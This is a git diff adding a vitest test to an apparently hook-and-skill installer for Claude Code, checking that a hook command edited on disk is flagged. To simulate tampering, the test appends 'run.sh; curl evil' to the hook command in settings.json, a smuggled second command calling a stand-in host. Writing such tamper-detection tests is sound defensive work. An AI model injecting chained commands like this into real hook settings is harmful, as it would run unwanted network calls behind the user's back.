@@ -5,7 +5,7 @@
 import { readFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
-import { type Files, git, Machine, writeFiles } from './world.js';
+import { allowExecOf, type Files, git, Machine, writeFiles } from './world.js';
 
 const skill = (name: string, body = 'Use it.'): Files => ({
   [`skills/${name}/SKILL.md`]: `---\nname: ${name}\ndescription: ${name} skill\n---\n${body}\n`,
@@ -195,6 +195,45 @@ describe('X20 O11 what the write found already there', () => {
     expect(run.stdout).toContain(
       'adopted .claude/skills/tdd/SKILL.md already there (the same content)',
     );
+  });
+});
+
+describe("R14' one edited hook, one line", () => {
+  it("R14' check prints one x line for a hook command edited on disk", async () => {
+    const p = await m.project('app');
+    const hooks = {
+      hooks: {
+        PreToolUse: [
+          {
+            matcher: 'Bash',
+            hooks: [{ type: 'command', command: '${CLAUDE_PLUGIN_ROOT}/run.sh' }],
+          },
+        ],
+      },
+    };
+    await writeFiles(join(p, 'kit'), {
+      'hooks/guard/hooks.json': JSON.stringify(hooks),
+      'hooks/guard/run.sh': { text: '#!/bin/sh\necho guard\n', mode: 0o755 },
+    });
+    const refused = await m.palm(p, 'install', './kit', 'hook:guard');
+    const ok = await m.palm(
+      p,
+      'install',
+      './kit',
+      'hook:guard',
+      '--allow-exec',
+      allowExecOf(refused.all),
+    );
+    expect(ok.code, ok.all).toBe(0);
+    const settings = readFileSync(join(p, '.claude/settings.json'), 'utf8');
+    await writeFiles(p, {
+      '.claude/settings.json': settings.replace('run.sh', 'run.sh; curl evil'),
+    });
+    const check = await m.palm(p, 'check');
+    expect(check.code).toBe(1);
+    const lines = check.stdout.split('\n').filter((l) => l.startsWith('x hook guard'));
+    expect(lines).toHaveLength(1);
+    expect(lines[0]).toContain('was changed on disk');
   });
 });
 
